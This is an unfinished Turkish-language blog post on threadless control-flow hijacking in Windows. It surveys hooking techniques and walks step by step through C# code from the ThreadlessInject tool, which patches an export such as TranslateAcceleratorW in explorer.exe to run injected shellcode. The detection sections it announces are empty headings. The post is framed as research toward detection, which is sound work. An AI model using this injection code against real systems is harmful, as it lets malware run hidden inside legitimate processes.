---
layout: post
title: "Threadless Control Flow Hijacking Methods, Analysis and Detection"
categories: blue
---

Selam bugün staj kabulüm için araştırdığım ve kendisi için tespit mekanizmaları geliştirmeye çalışacağım control flow hijacking konusunu irdeleyeceğiz.

## İÇERİKLER
1. [Nedir bu hreadless Control Flow Hijacking ?](#nedir-bu-threadless-control-flow-hijacking-)
2. [Basit Bir Saldırı Örneği](#basit-bir-saldırı-örneğ)
3. [Basit Saldırı Örneğine Karşı Statik ve Dinamik Tespit Mekanizmaları](#basit-saldırı-örneğine-karşı-statik-ve-dinamik-tespit-mekanizmaları)
4. [Karmaşık Bir Saldırı Örneği](#karmaşık-bir-saldırı-örneği)
5. [Karmaşık Saldırı Örneğine Karşı Statik ve Dinamik Tespit Mekanizmaları](#basit-saldırı-örneğine-karşı-statik-ve-dinamik-tespit-mekanizmaları)
6. [Kapanış](#kapanış)


## Nedir bu Threadless Control Flow Hijacking ?

Türkçe "kontrol akışını ele geçirme" şeklinde çevirebiliriz. Anlaşıldığı üzere çook geniş bir saldırı spektrumundan bahsediyoruz bu saldırı türünün içine pwn tarafında bufferoverflow ile stack teki ret adresini ele geçirme yahut heapoverflow ile fonksiyon pointer larının üzerine shellcode adresimizi yazmak girebilir. Malware tarafında ise dümdüz hedef process in thread lerinden birini durdurup kendi ayarladığımız context i yükleyip shellcode umuzu çalıştırmak gibi fikirler bu saldırı vektörü altında toplanabilir. Kısaca programın olağan akışını durdurmak, zehirlemek yada değiştirmek gibi her türlü faaliyeti Control Flow Hijacking altında değerlendirebiliriz.

Bu yazıda ilgileneceğimiz control hijack metodları threadless yani process de ekstra bir thread açmadan, thread akışlarına müdahale etmeyen metodlar olacak. Mevcut bir thread in bir şekilde bizim istediğimiz şeyleri yapmasını sağlamalıyız. Bunun için kullanabileceğimiz taktikleri şu şekilde listeleyebiliriz:
 - İşlevi argümanları alıp başka bir fonksiyona call yada jmp ile gitmek olan bir fonksiyonun gitmeye çalıştığı adres i patch leyebiliriz
 - IAT daki api lere hook atabiliriz böylece mesela program dosya okumak için CreateFile api sini çağırmak istediğinde aslında bizim istediğimiz adresteki kodu çalıştırır
 - exception handler a hook atıp programın bir exception durumunda bizim istediğimiz adresteki kodu çalıştırmasını sağlayabiliriz
 - class sistemi kullanan bir dille derlenmişse program vtable lardaki fonksiyon adreslerini kendi çalıştırılmasını istediğimiz adresle değiştirebiliriz
 - process deki main module un kullandığı herhangi bir dll deki export edilen fonksiyon adreslerini zararlı kod adresi ile değiştirip mesela kullanıcının user32 deki MessageBox api sini çağırdığı zaman dll in bizim istediğimiz adresi çalıştırmasını sağlayabiliriz
 - bir fonksiyon pointer ı bulup adresini çalıştırılmasını istediğimiz shellcode adresi ile değiştirebiliriz

Şimdilik derleyebildiğim yöntemler bu şekilde. Kernel taraflı yöntemlerin de olduğuna eminim ama bunlar konusunda henüz bir bilgim yok.
Dilerseniz bu yöntemi kullanan ilk saldırı örneğimize geçelim ve yöntemi daha yakından tanıyalım.

## Basit Bir Saldırı Örneği

Basit saldırı örneği için [ThreadlessInject]https://github.com/CCob/ThreadlessInject/tree/master deki injection kodunu kullanıcaz.
Burdaki fikir hedef process deki main module(exe) un çalıştıracağını bildiğimiz bir fonksiyonu gözümüze kestirip onu hook lamak. Bu ister main module deki bir fonksiyon olsun ister onun kullandığı dll lerdeki. Hook lıcaz.
Her açılışta exe nin yada diğer dll lerin process in virtual address space inde nerelerde olduğunu gözlememek istemediğimiz için (yada bunun malware yazarları için hiç pratik ve kolay olmadığı için) pdb file ına erişebildiğimiz yani sembollerine yani spesifik fonksiyonlarının hangi offsetlere veya rva lara yüklendiğini bildiğimiz dll veya exe lerin fonksiyonlarını hook lamak daha mantıklı ve çok daha kolay, daha da kolayı export edilmiş fonksiyonlarını hook lamak bunun için de windows api lerinden yararlanıcaz.
Bunun için öncelikle fonksiyonunu hook lamak istediğimiz module ün handle ını `GetModuleHandle` api si ile alıp o module un bu handle aracılığı ile hangi export edilmiş fonksiyonuna erişmek istiyorsak `GetProcAddress` api sine fonksiyon ismini verip export edilen fonksiyonun adresini cebe atıyoruz.
```csharp
string dll = "user32.dll";
string export = "TranslateAcceleratorW";
var hModule = GetModuleHandle(dll);
if (hModule == IntPtr.Zero)
    hModule = LoadLibrary(dll);
var exportAddress = GetProcAddress(hModule, export);
```
Burda ince bir ayrıntı var ondan bahsetmeden geçmeyelim. `GetModuleHandle` api sinin module handle ını bulamadığı durumda ki bu o anki process imizde bu module yok demek, o module ü `LoadLibrary` api si ile process imize yüklüyoruz. Bakın kafa karışıklığı olmasın burda yükleme yaptığımız process bizim process imiz yani malware process i hedef process değil. Hedef process de yüklü olan bir module malware process de yok ama bize o module deki fonksiyonun adres lazım e napıyoruz. Module u kendi process imize yükleyip bu sayede adresi elde ediyoruz. Windows un knownDLL listesinden (kernelbase.dll, kernel32.dll, user32.dll, ntdll.dll vs.) bir dll i hedef leyeceğiz çünkü bu listedeki dll ler genellikle her process de aynı base address e yükleniyor bu yüzden malware process imizdeki exportAddress %99 diğer process lerde de aynı fonksiyonu barındırıyor olacak. Eğer bir windows dll ine değil herhangi bir dll e hook atmamız gerekseydi adresi tespit etmek için hedef process de biraz daha iş görmemiz gerekecekti neyseki şuanki senaryoda kendi process imizden(malware process) hedef process deki hook adresimizi kolayca hesaplayabiliyoruz.

var status = OpenProcess(pids[i], out var hProcess);

```csharp
var status = OpenProcess(hedef_process_id, out var hProcess);
```
Hedef process memory sinde dolanabilmek için hedef process in handle ını alıyoruz.

```csharp
var loaderAddress = FindMemoryHole(
    hProcess,
    (ulong)exportAddress,
    ShellcodeLoader.Length + shellcode.Length);
```
Bu fonksiyonun amacı şu:
Hook attığımız adrese bir relative call instruction koyucaz bu call daha önceden allocate ettiğimiz bir bellek bölgesine götürücek bizi ve shellcode umuzda burda olacak neden shellcode u direkt hook attığımız adrese koymuyoruz diye soracak olursan sebebi hook attığımız adresteki fonksiyonun uzunluğu shellcode umuzdan daha küçük ise shellcode execute veya write iznimizin olmadığı bir bölgeye taşabilir buda yazma veya çalıştırma sırasında hata alacağımız anlamına gelir o yüzden hook atma prosüdürü hep bir relative jmp veya call ile başlar sonra trampoline fonksiyonu dediğimiz bir yönlendirici ile devam eder bu projede yazar trampoline fonksiyonu kullanmamış original byte ları hook fonksiyonunda düzeltmiş ve hook fonksiyonun sonunda hook attığımız adrese dönüşü sağlamış, tercih meselesi napcan.
Neyse amacı anlatmaya devam edeyim peki bu `FindMemoryHole` ne işe yarıyor? relative call ile gidebileceğimiz bir aralıkta bir bölgeyi allocate etmeye çalışıyor hudutlarımızı biliyoruz ve çalışıyoruz hesaaabııı.

```csharp
var originalBytes = Marshal.ReadInt64(exportAddress);// originalBytes = *exportAddress şeklinde düşünebilirsiniz burdaki işlemi
GenerateHook(originalBytes);
```
burda hook fonksiyonunun exportAddress deki instruction ları çalıştıktan sonra tekrar düzeltmesi için hardcoded yazılan hook fonksiyonunun içindeki placeholder byte ları exportAddress deki byte lar ile değiştiriyoruz daha önce stub yazmış olanlar olayı anladı. Anlamayanlarda projedeki `GenerateHook` fonksiyonuna şöyle bir bakınca anlayacaktır ne demek istediğimi konudan çok sapmamak için hook fonksiyonun iç mekaniğine çok girmemeyeyim diye düşündüm.

```csharp
ProtectVirtualMemory(
    hProcess,
    exportAddress,
    8,
    MemoryProtection.ExecuteReadWrite,
    out var oldProtect);

var relativeLoaderAddress = (int)(loaderAddress - ((ulong)exportAddress + 5));
var callOpCode = new byte[] { 0xe8, 0, 0, 0, 0 };

using var ms = new MemoryStream(callOpCode);
using var br = new BinaryWriter(ms);
br.Seek(1, SeekOrigin.Begin);
br.Write(relativeLoaderAddress);

status = WriteVirtualMemory(
    hProcess,
    exportAddress,
    callOpCode,
    out var bytesWritten);
```
Bu kısımda exportAddress e hook fonksiyonuna zıplayan relative call instruction ını yazıyoruz. Yukarda bahsettiğim gibi hook fonksiyonuna aslında burda olan byte ları yerleştirdiğimiz için bu yaramazlığımızı düzeltip programın hiçbir şey olmamış gibi çalışmaya devam etmesini sağlayabilecez.

```csharp
status = ProtectVirtualMemory(
    hProcess,
    (IntPtr)loaderAddress,
    (uint)payload.Length,
    MemoryProtection.ReadWrite,
    out oldProtect);

status = WriteVirtualMemory(
    hProcess,
    (IntPtr)loaderAddress,
    payload,
    out bytesWritten);

status = ProtectVirtualMemory(
    hProcess,
    (IntPtr)loaderAddress,
    (uint)payload.Length,
    oldProtect,
    out _);
```
Bu işlemlerle önce hook fonksiyonumuza tahsis ettiğimiz adrese(loaderAddress diye geçiyor kodda)(`FindMemoryHole` fonksiyonu ile allocate ettiğimiz adres) hook fonksiyonumuzu yazıyoruz.

explorer.exe `TranslateAcceleratorW` api sini neredeyse her saniye çağırıyor o yüzden onu hook lamak istedim. Görelim.
<video width="640" height="360" controls>
  <source src="/control-flow-hijack-basic-poc.mkv" type="video/mp4">
  Tarayıcınız video etiketini desteklemiyor.
</video>


## Basit Saldırı Örneğine Karşı Statik ve Dinamik Tespit Mekanizmaları

## Karmaşık Bir Saldırı Örneği

## Karmaşık Saldırı Örneğine Karşı Statik ve Dinamik Tespit Mekanizmaları

## Kapanış